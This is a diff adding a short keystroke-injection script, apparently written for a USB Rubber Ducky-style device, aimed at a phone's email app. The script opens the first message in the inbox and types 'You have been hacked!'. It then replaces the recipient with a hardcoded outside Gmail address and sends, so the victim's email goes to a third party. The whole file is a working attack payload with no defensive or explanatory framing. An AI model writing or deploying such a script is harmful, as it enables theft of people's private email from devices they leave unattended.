@@ -1,0 +1,36 @@
+REM Forwards the first email in the primary section
+REM GMAIL SHORTCUTS https://support.google.com/mail/answer/6594?co=GENIE.Platform%3DAndroid&hl=en&oco=1
+DELAY 1000
+REM open Email application
+GUI e
+DELAY 3000
+TAB
+DELAY 500
+TAB
+DELAY 500
+REM choose the Email to be redirected
+ENTER
+DELAY 500
+REM Reply all shortcut
+CTRL r
+DELAY 1000
+STRING You have been hacked! your email was redirected :)
+DELAY 2000
+TAB
+DELAY 1000
+REM Proceed to email recipient field
+TAB
+DELAY 1000
+LEFTARROW
+REM Delete to email address written by default
+DELAY 1000
+DELETE
+DELAY 1000
+REM Write the email address the message would be forwarded
+STRING asylbekbug@gmail.com
+DELAY 1000
+REM Send the email
+CTRL ENTER
+DELAY 1000
+REM change to the next email
+RIGHTARROW
